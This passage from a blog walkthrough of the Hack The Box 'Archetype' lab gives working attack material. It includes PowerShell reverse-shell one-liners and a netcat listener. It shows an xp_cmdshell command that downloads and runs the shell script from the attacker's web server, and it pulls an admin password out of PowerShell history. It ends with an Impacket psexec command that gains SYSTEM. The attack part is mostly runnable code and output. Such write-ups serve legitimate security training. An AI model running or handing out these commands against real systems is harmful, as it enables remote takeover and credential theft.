this. üëá</p><pre><code class="language-bash">$client = New-Object System.Net.Sockets.TCPClient('YourIP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

$sm=(New-Object Net.Sockets.TCPClient('YourIP',4444)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2&gt;&amp;1));$sm.Write($st,0,$st.Length)}</code></pre><blockquote>Remember: Type <strong><strong><code>ifconfig tun0</code> </strong></strong>and replace<strong><strong> YourIP</strong></strong></blockquote><h3 id="023-get-reverse-shell">02.3 Get Reverse Shell</h3><p>Now time to get reverse shell. Save above <code>powershell script</code> as anyname.ps1 (here I use script.ps1) and power up python demon webserver. I'm a very lasy man you know üôÑ so here I use <code><a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">updog</a></code><a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer"> </a>instead of typing long shit in python üòë</p><blockquote>Updog is a replacement for Python's <code>SimpleHTTPServer</code>. It allows uploading and downloading via HTTP/S, can set ad hoc SSL certificates and use HTTP basic auth.source : <a href="https://github.com/sc0tfree/updog" rel="noopener noreferrer">https://github.com/sc0tfree/updog</a>‚Äãroot in</blockquote><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ updog
[+] Serving /root/Documents/HackThebox/Archetype...
 * Running on http://0.0.0.0:9090/ (Press CTRL+C to quit)</code></pre><p>To listen the connection, I always use the swiss army knife (<strong><strong>netcat) </strong></strong>tool. personally I do not like to get shell through multi handler (metasploit). Trust me, using <code>netcat</code> tool you can learn a lot of things beyond <code>metaspolit</code>. üëΩ</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ nc -lvnp 4444
 listening on [any] 4444 ... </code></pre><hr></hr><h2 id="03-exploit-the-target-%E2%80%A6">03. Exploit the target ‚Ä¶</h2><p>Now we can issue the command to download and execute the reverse shell through <code>xp_cmdshell</code>.</p><pre><code class="language-bash">EXEC xp_cmdshell 'echo IEX (New-Object Net.WebClient).DownloadString("http://10.10.16.39:9090/script.ps1") | powershell -noprofile'
</code></pre><p>I divided up my terminal up to 3 parts using ¬†<a href="https://github.com/tmux/tmux/wiki" rel="noopener noreferrer">Tmux</a> multiplexer.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLHaXzk27LyhbgDjUf%2Fimage.png?alt=media&amp;token=0fa21382-731a-4469-911e-4a8d5ec43a1e" class="kg-image" alt width="1555" height="738" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1">RevShell</span></figcaption></figure><p>Woooh!!! We got our shell. üíÄ A shell is received as <strong><strong><code>sql_svc</code></strong></strong>, and we can get the user.txt flag. </p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLIl1OHkcfDhlSqmNy%2Fimage.png?alt=media&amp;token=4160f34e-df3f-48ca-bc15-0e59feca779b" class="kg-image" alt width="723" height="448" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1">user.txt</span></figcaption></figure><hr></hr><h2 id="04-privilege-escalation-%E2%80%A6">04. Privilege Escalation ‚Ä¶</h2><p>To escalate privileges we can run different tools. By the way, before run any tool there are some steps that you need to run to enumerate some information. I will be showing you one by one in each walkthroughs.</p><p>Did you remember? now we are in service account called <strong><strong><code>sql_svc</code>. </strong></strong>It's good practice to check recently accessed files/executed commands (<em>Keep in mind as good practice</em>). ¬†Mostly (default) our console history will be saved in <code>C:\Users\&lt;account_name&gt;\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> . Now you understand what our next step is.</p><p>Right, Let's check above file using <code>type</code> command.</p><pre><code class="language-bash">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
</code></pre><p>Here is the output üëá</p><pre><code class="language-bash">PS C:\Users\Administrator&gt; type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
PS C:\Users\Administrator&gt;</code></pre><p>Oh no no no noooo.. You see?</p><p>The backup share is mapped with admin credentials. Remember if you saw something like this. ready to launch Impacket's <a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" rel="noopener noreferrer"><code>psexec.py</code></a> script.</p><pre><code class="language-bash">python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
</code></pre><p>Here is the output üëá</p><pre><code class="language-bash">root in ~/Documents/HackThebox/Archetype üêç v3.9.2
‚ö°‚ùØ python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.10.10.27
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.10.10.27.....
[*] Found writable share ADMIN$
[*] Uploading file gZiCFMKg.exe
[*] Opening SVCManager on 10.10.10.27.....
[*] Creating service FuWR on 10.10.10.27.....
[*] Starting service FuWR.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;</code></pre><p>Finally we have Administrator Privileges. üëå Now we can access the flag on the administrator desktop.</p><figure class="kg-card kg-image-card kg-card-hascaption"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYKZ_p9uWcJk-xmystC%2F-MYLP7ji_aKDAJVwtM3-%2Fimage.png?alt=media&amp;token=34f7112a-ba5b-4bd0-a2ae-c1d030b68a25" class="kg-image" alt width="1094" height="614" layout="responsive"></amp-img><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1">root.txt</span></figcaption></figure><figure class="kg-card kg-image-card"><amp-img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-M_zEsWTNjRcuOaViQsC%2F-M_zFfzCHXa8Hugk-ADS%2Fimage.png?alt=media&amp;token=93d84b32-2d92-43ab-adf3-f9e1270cb647" class="kg-image" alt width="867" height="764" layout="responsive"></amp-img></figure><figure class="kg-card kg-image-card"><amp-img src="http://192.168.8.3:2368/content/images/2021/05/image-5.png" class="kg-image" alt width="292" height="172" layout="fixed"></amp-img></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>

            </section>

        </article>
    </main>
    <footer class="page-footer">
            <amp-img class="site-icon" src="http://192.168.8.3:2368/content/images/2021/05/hnet.com-image.ico" width="50" height="50" layout="fixed"></amp-img>
        <h3>h4rithd.com</h3>
            <p>Penetration Tester | Ethical Hacker | Security Researcher</p>
        <p><a href="../../index.html">Read more posts ‚Üí</a></p>
        <a class="powered" href="https://ghost.org" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 156 156"><g fill="none" fill-rule="evenodd"><rect fill="#15212B" width="156" height="156" rx="27"/><g transform="translate(36 36)" fill="#F6F8FA"><path d="M0 71.007A4.004 4.004 0 014 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0130 84H4a4 4 0 01-4-4.007v-8.986zM50 71.007A4.004 4.004 0 0154 67h26a4 4 0 014 4.007v8.986A4.004 4.004 0 0180 84H54a4 4 0 01-4-4.007v-8.986z"/><rect y="34" width="84" height="17" rx="4"/><path d="M0 4.007A4.007 4.007 0 014.007 0h41.986A4.003 4.003 0 0150 4.007v8.986A4.007 4.007 0 0145.993 17H4.007A4.003 4.003 0 010 12.993V4.007z"/><rect x="67" width="17" height="17" rx="4"/></g></g></svg> Published with Ghost</a>
    </footer>
    
</body>
</html>
